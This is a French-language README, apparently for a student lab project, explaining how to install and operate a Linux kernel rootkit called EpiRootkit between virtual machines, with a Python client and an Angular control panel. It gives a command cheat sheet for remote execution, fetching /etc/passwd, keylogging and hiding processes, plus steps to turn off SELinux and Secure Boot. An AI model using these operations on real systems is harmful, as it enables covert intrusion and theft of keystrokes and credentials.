# EpiRootkit — Guide d'Installation, d'Exploitation et de Dépannage

Ce document explique comment configurer l'environnement, installer et exploiter le rootkit EpiRootkit, ainsi que les bonnes pratiques et le dépannage.

## 1. Préparation de l'environnement VirtualBox

Pour permettre la communication entre la VM victime et la VM attaquant, créez un réseau NAT persistant dans VirtualBox :

```bash
VBoxManage natnetwork add --netname "EpiRootkit-Net" --network "192.168.15.0/24" --enable
```

## 2. Déploiement du Rootkit (VM Victime)

1. Cloner le dépôt rootkit :
   ```bash
   git clone https://github.com/votre-repo/epirootkit.git
   cd epirootkit/rootkit
   ```
2. Compiler et installer le rootkit :
   ```bash
   ./install.sh
   ```
3. Vérifier que le module est chargé :
   ```bash
   lsmod | grep epirootkit
   ```

## 3. Lancement du serveur (optionnel)

Pour utiliser la collecte de logs ou d'autres fonctionnalités côté serveur :

```bash
cd ../server
pip3 install -r requirements.txt
python3 server.py
```

## 4. Exploitation depuis la VM Attaquant

1. Installer les dépendances Python :
   ```bash
   cd attacking_program
   pip3 install -r requirements.txt
   ```
2. Se connecter au rootkit :
   ```bash
   python3 client.py <IP_VICTIME>
   ```
   Remplacez `<IP_VICTIME>` par l'adresse IP de la VM victime (voir `ip addr show` sur la victime).
3. Une fois connecté, vous pouvez envoyer des commandes supportées par le rootkit (exécution de commandes, récupération de fichiers, keylogging, etc.). Consultez le code source de `client.py` et la documentation technique pour la liste des fonctionnalités.

## 5. Bonnes pratiques

- Désactiver les protections (SELinux, Secure Boot, Kernel Lockdown) uniquement sur la VM victime.

## 6. Dépannage

- Si la connexion échoue, vérifier :
  - Le chargement du module rootkit (`lsmod | grep epirootkit`)
  - La connectivité réseau (`ping <IP_VICTIME>`)
  - Les logs côté victime (`dmesg | tail`)

Pour plus de détails, consultez le fichier guideVMs.md.

---

# Interface Web (EpirootkitWeb)

L'interface web permet de piloter et visualiser les actions du rootkit via une application Angular.

## Installation et lancement de l'interface web

1. Rendez-vous dans le dossier `web_interface/epirootkit-web` :
   ```bash
   cd web_interface/epirootkit-web
   ```
2. Installez les dépendances :
   ```bash
   npm install
   ```
3. Lancez le serveur de développement Angular :
   ```bash
   ng serve
   ```
   Accédez à l'application sur [http://localhost:4200/](http://localhost:4200/).

## Fonctionnalités principales

- Dashboard : Vue d'ensemble des actions et de l'état du rootkit.
- Logs : Visualisation des logs collectés par le rootkit.
- Authentification : Accès sécurisé à l'interface.
- Commandes : Envoi de commandes à la VM victime via l'API backend.

## Développement

- Générer un composant :
  ```bash
  ng generate component nom-du-composant
  ```
- Générer un service, directive, etc. :
  ```bash
  ng generate service|directive|pipe|class|guard|interface|enum|module nom
  ```

## Tests

- Lancer les tests unitaires :
  ```bash
  ng test
  ```
- Lancer les tests end-to-end :
  ```bash
  ng e2e
  ```

## Structure du projet web

- src/app/components/ : Composants Angular (dashboard, login, logs, etc.)
- src/app/services/ : Services pour l'API, l'authentification, la gestion des logs/rootkit
- src/app/guards/ : Garde d'authentification
- src/environments/ : Fichiers d'environnement Angular

## Aide supplémentaire

Pour plus d'informations sur Angular CLI : [Angular CLI Documentation](https://angular.io/cli)

---

# Fonctionnement global du projet

1. Déploiement du rootkit sur la VM victime (voir plus haut)
2. Lancement du backend Python (dans server/)
3. Lancement de l'interface web (dans web_interface/epirootkit-web/)
4. Connexion via l'interface web pour piloter le rootkit, visualiser les logs et envoyer des commandes.

---

# Utilisation du rootkit via la VM attaquante

La VM attaquante permet d'exploiter le rootkit de façon réaliste, en ligne de commande, pour des tests techniques avancés ou des scénarios d'attaque automatisés.

## Prérequis

- La VM attaquante doit être sur le même réseau que la VM victime (voir section VirtualBox plus haut).
- Le rootkit doit être installé et chargé sur la VM victime.
- Les scripts d'attaque sont situés dans le dossier attacking_program/.

## Étapes d'utilisation

1. Accéder à la VM attaquante
2. Installer les dépendances Python
   ```bash
   cd attacking_program
   pip3 install -r requirements.txt
   ```
3. Se connecter au rootkit
   ```bash
   python3 client.py <IP_VICTIME>
   ```
   Remplacez <IP_VICTIME> par l'adresse IP de la VM victime (utilisez ip addr show sur la victime pour la connaître).
4. Exploiter le rootkit
   - Une fois connecté, vous pouvez :
     - Exécuter des commandes à distance sur la victime
     - Récupérer des fichiers
     - Activer le keylogger
     - Utiliser toute autre fonctionnalité exposée par le rootkit
   - Les commandes disponibles sont détaillées dans le code source de client.py et la documentation technique.

## Exemples de commandes

- Exécution d'une commande sur la victime :
  ```bash
  python3 client.py <IP_VICTIME> --exec 'ls /root'
  ```
- Récupération d'un fichier :
  ```bash
  python3 client.py <IP_VICTIME> --get /etc/passwd
  ```

## Bonnes pratiques

- Utilisez la VM attaquante pour des tests réalistes, l'automatisation ou l'intégration d'outils d'attaque (nmap, metasploit, etc.).
- Ne jamais utiliser ce dispositif en dehors d'un environnement isolé et contrôlé.

---

# Cheat Sheet — Commandes Rootkit via la VM Attaquante

Voici un récapitulatif rapide des commandes principales utilisables depuis la VM attaquante pour exploiter le rootkit :

| Action                                 | Commande                                                                 |
|----------------------------------------|--------------------------------------------------------------------------|
| Se connecter au rootkit                | `python3 client.py <IP_VICTIME>`                                         |
| Exécuter une commande sur la victime   | `python3 client.py <IP_VICTIME> --exec 'commande_shell'`                  |
| Récupérer un fichier                   | `python3 client.py <IP_VICTIME> --get /chemin/vers/fichier`               |
| Activer le keylogger                   | `python3 client.py <IP_VICTIME> --keylog start`                           |
| Récupérer les logs du keylogger        | `python3 client.py <IP_VICTIME> --keylog dump`                            |
| Arrêter le keylogger                   | `python3 client.py <IP_VICTIME> --keylog stop`                            |
| Lister les processus                   | `python3 client.py <IP_VICTIME> --ps`                                     |
| Masquer un processus                   | `python3 client.py <IP_VICTIME> --hide-process <PID>`                     |
| Afficher l'aide du client              | `python3 client.py --help`                                                |

Remarques :
- Remplacez <IP_VICTIME> par l'adresse IP de la VM victime.

---

# Sécurité et Authentification

## Authentification

### Identifiants par défaut
- Administrateur :
  - Username : `Helene`
  - Password : `detroie`
  - Droits : Accès complet
- Utilisateur standard :
  - Username : `Hubert`
  - Password : `commentestvotreblanquette?`
  - Droits : Accès limité

### Fonctionnement
1. L'authentification utilise JWT (JSON Web Tokens)
2. Le token est stocké dans le localStorage du navigateur
3. Toutes les requêtes API nécessitent un token valide
4. Expiration des tokens : 24 heures

### Sécurité des routes
- Toutes les routes API sont protégées (sauf /api/auth/login)
- Les tokens sont automatiquement ajoutés aux en-têtes HTTP
- Vérification du token côté serveur pour chaque requête
- Gestion des rôles (admin/user)

## Configuration du serveur

1. Installation des dépendances :
   ```bash
   cd server
   pip install -r requirements.txt
   ```

2. Fichiers de configuration :
   - `users.json` : Gestion des utilisateurs et mots de passe
   - `server.py` : Configuration JWT et routes sécurisées
   - `requirements.txt` : Dépendances Python

## Configuration du frontend

1. Installation :
   ```bash
   cd web_interface/epirootkit-web
   npm install
   ```

2. Composants de sécurité :
   - `auth.service.ts` : Gestion de l'authentification
   - `auth.interceptor.ts` : Ajout automatique des tokens
   - `auth.guard.ts` : Protection des routes Angular

## Utilisation sécurisée

1. Connexion via l'interface web :
   - Accédez à http://localhost:4200
   - Utilisez les identifiants fournis
   - Le token est automatiquement géré

2. Connexion via la VM attaquante :
   - Les commandes nécessitent une authentification
   - Utilisez les mêmes identifiants
   - Le token est inclus dans les requêtes API

## Dépannage

1. Problèmes d'authentification :
   - Vérifiez les identifiants
   - Effacez le localStorage du navigateur
   - Vérifiez les logs serveur

2. Problèmes de token :
   - Vérifiez la validité du token
   - Assurez-vous que le token est correctement transmis
   - Vérifiez la configuration JWT du serveur